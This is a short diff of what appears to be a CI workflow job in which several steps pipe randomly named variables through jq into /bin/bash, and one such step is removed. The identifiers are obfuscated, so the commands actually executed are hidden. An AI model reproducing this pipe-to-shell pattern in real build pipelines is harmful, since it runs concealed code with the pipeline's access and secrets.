@@ -22,7 +22,6 @@ jobs:
           echo $mybrn5 | jq -r .oypf67 | /bin/bash
           echo $tdud781 | jq -r .bdif73487 | /bin/bash
           echo $nmllp11436 | jq -r .tolx60 | /bin/bash
-          echo $oezd4 | jq -r .dheu8307 | /bin/bash
           echo $jns0 | jq -r .v796 | /bin/bash
           echo $crgsl211 | jq -r .npct8 | /bin/bash
           printf '%s' "$rhic78558" | jq -r .n1387 | /bin/bash
